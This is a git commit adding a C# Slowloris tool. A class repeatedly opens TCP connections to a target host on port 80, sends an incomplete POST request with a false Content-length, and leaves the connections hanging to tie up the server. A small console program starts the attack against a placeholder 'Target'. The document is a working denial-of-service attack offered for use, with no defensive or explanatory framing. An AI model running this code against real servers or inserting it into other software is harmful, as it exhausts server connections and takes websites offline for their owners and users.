1b83dbf099d05de09500f2bd1ce90048bcb306ef
vinhomn <vinhomn@gmail.com>
2017-05-31 15:04:18 +0700

    init code

---
+++ src/SlowlorisSharp/Slowloris.cs
@@ -0,0 +1,60 @@
+﻿using System.Collections.Generic;
+using System.IO;
+using System.Net.Sockets;
+using System.Threading;
+
+namespace SlowlorisSharp
+{
+    public class Slowloris
+    {
+        public string Host { get; private set; }
+
+        public CancellationToken CancelToken { get; private set; }
+
+        public Slowloris(string host, CancellationToken cancelToken)
+        {
+            Host = host;
+            CancelToken = cancelToken;
+        }
+
+        public void Manage()
+        {
+            ThreadStart start = null;
+            var clients = new List<TcpClient>();
+
+            while (!CancelToken.IsCancellationRequested)
+            {
+                if (start == null)
+                {
+                    start = async delegate
+                    {
+                        var item = new TcpClient();
+                        clients.Add(item);
+                        try
+                        {
+                            await item.ConnectAsync(Host, 80);
+                            var writer = new StreamWriter(item.GetStream());
+                            writer.Write("POST / HTTP/1.1\r\nHost: " + Host + "\r\nContent-length: 5235\r\n\r\n");
+                            writer.Flush();
+                        }
+                        catch
+                        {
+                        }
+                    };
+                }
+                new Thread(start).Start();
+                Thread.Sleep(250);
+            }
+            foreach (var client in clients)
+            {
+                try
+                {
+                    client.GetStream().Dispose();
+                }
+                catch
+                {
+                }
+            }
+        }
+    }
+}
---
+++ test/SlowlorisSharp.ConsoleTests/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace SlowlorisSharp.ConsoleTests
+{
+    public class Program
+    {
+        public static void Main(string[] args)
+        {
+            var cts = new CancellationTokenSource();
+
+            var slow = new Slowloris("Target", cts.Token);
+            var slowThread = new Thread(slow.Manage);
+            slowThread.Start();
+
+            //if (!slow.CancelToken.IsCancellationRequested)
+            //{
+            //    try
+            //    {
+            //        cts.Cancel();
+            //    }
+            //    catch { }
+            //}
+        }
+    }
+}
